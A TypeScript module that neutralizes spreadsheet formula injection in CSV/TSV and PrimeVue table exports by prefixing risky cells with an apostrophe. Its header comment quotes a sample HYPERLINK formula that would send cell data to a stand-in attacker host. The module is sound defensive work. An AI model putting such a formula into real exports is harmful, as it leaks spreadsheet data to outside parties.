/**
 * CSV/TSV formula-injection defense (security assessment M4).
 *
 * Spreadsheet apps (Excel, LibreOffice, Google Sheets) evaluate a cell whose
 * text starts with `=`, `+`, `-`, `@`, tab or CR as a formula. Graph property
 * values come straight from the warehouse, so a row like
 * `=HYPERLINK("http://evil/?"&A1,"Click")` would become a live formula in a
 * colleague's spreadsheet. Every export path runs its cells through
 * `safeCell` / `safeCellText`, which prefix such text with `'` so it opens as
 * text.
 *
 * Only text is touched: a typed number (`-5`) and a string that is a plain
 * numeric literal (`"-5"`, `"+1.5e3"`, from untyped warehouse results) cannot
 * carry a formula and stay numbers in the spreadsheet.
 */

const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/** A bare decimal literal: optional sign, digits/decimal point, optional exponent. */
const NUMERIC_LITERAL = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/;

/**
 * Neutralize a cell value for spreadsheet export. Strings that a spreadsheet
 * would evaluate as a formula get a leading `'`; anything else (numbers,
 * booleans, null, plain numeric strings, safe text) is returned unchanged.
 */
export function safeCell<T>(value: T): T | string {
  if (typeof value !== 'string' || value.length === 0) return value;
  if (!FORMULA_TRIGGERS.has(value[0])) return value;
  if (NUMERIC_LITERAL.test(value)) return value;
  return `'${value}`;
}

/**
 * Stringify a cell value and neutralize it. Typed numbers/booleans pass through
 * as-is; everything else (strings, but also arrays, objects and dates, whose
 * `String()` form can start with a trigger, e.g. `['=1+1']` → `=1+1`) is
 * checked after stringification. `null`/`undefined` become `''`.
 */
export function safeCellText(value: unknown): string {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number' || typeof value === 'bigint' || typeof value === 'boolean') {
    return String(value);
  }
  return safeCell(String(value));
}

/**
 * Formula-safe, RFC-4180-style field for delimited text (works for both ','
 * and '\t' separators). `null`/`undefined` become an empty field.
 */
export function escapeDelimitedField(value: unknown, sep: string): string {
  const s = safeCellText(value);
  if (s.includes(sep) || s.includes('"') || s.includes('\n') || s.includes('\r')) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/**
 * PrimeVue DataTable `exportFunction`. PrimeVue wraps the returned string in
 * double quotes itself, so this only neutralizes formulas and doubles inner
 * quotes (mirroring PrimeVue's default `String(v).replace(/"/g, '""')`).
 */
export function primeVueExportCell({ data }: { data: unknown; field?: string }): string {
  return safeCellText(data).replace(/"/g, '""');
}

/**
 * PrimeVue Column `exportHeader`. PrimeVue writes headers verbatim inside
 * quotes (no escaping), and headers carry graph property keys, so they get
 * the same treatment as cells.
 */
export function primeVueExportHeader(header: string): string {
  return primeVueExportCell({ data: header });
}
